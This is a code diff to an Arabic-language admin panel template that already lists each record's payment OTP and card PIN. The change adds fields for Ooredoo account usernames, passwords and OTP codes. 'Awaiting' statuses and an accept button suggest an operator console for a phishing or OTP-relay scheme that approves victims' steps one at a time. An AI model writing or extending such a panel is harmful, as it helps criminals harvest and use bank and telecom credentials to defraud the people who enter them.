@@ -570,6 +570,11 @@ function openPop(ref){
 <div class="drow"><span class="k">رمز التأكيد (OTP)</span><span class="v" style="direction:ltr">${esc(typeof o.pay.otp === 'boolean' ? '-' : (o.pay.otp || o.pay.code || '-'))}</span></div>
 <div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(typeof o.pay.pin === 'boolean' ? '-' : (o.pay.pin || '-'))}</span></div>
 </div></div>` : ""}
+${ (o.ooredooUser || o.ooredooPass || o.ooredooOtp) ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
+<div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredooUser || '')}</span></div>
+<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredooPass || '')}</span></div>
+<div class="drow"><span class="k">رمز التحقق OTP</span><span class="v" style="direction:ltr">${esc(o.ooredooOtp || '')}</span></div>
+</div></div>` : '' }
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
       <div style="flex:1 0 100%; margin-bottom:6px; font-weight:800">الخطوة الحالية: ${stepName(o.step)}</div>
       <button class="rbtn accept" data-accept="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
